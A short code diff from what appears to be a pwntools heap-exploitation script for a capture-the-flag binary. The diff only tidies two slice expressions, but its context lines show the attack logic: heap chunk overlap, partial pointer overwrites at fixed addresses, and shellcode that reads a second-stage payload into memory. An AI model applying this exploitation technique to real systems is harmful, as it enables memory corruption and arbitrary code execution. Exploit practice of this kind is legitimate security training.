@@ -71,7 +71,7 @@ if __name__ == '__main__':
     alloc("E"*0x28)
     edit(2,'C'*0x20+p64(0x20+0x30)+p8(0x30))
     free(3)
-    edit(1,p64(0x604098)[0:3])
+    edit(1, p64(0x604098)[:3])
     shellcode_addr=0x606060
     #payload="\x48\xc7\xc7\x50\x40\x60\x00\x48\xbe\xef\xbe\xad\xde\x00\x00\x00\x00\x48\x89\x37\xeb\xea"
     payload=asm(shellcraft.amd64.linux.syscall(0,0,shellcode_addr,0x800),os="linux",arch="amd64")
@@ -82,7 +82,7 @@ if __name__ == '__main__':
     alloc(payload)
     alloc("F"*0x28)
     alloc("G"*0x28)
-    edit(0,p64(0x604038)[0:3])
+    edit(0, p64(0x604038)[:3])
     alloc("J"*0x28)
     alloc("H"*0x20+p64(mmap_address+0x18))
     stack_ret=0x7fffffffd8
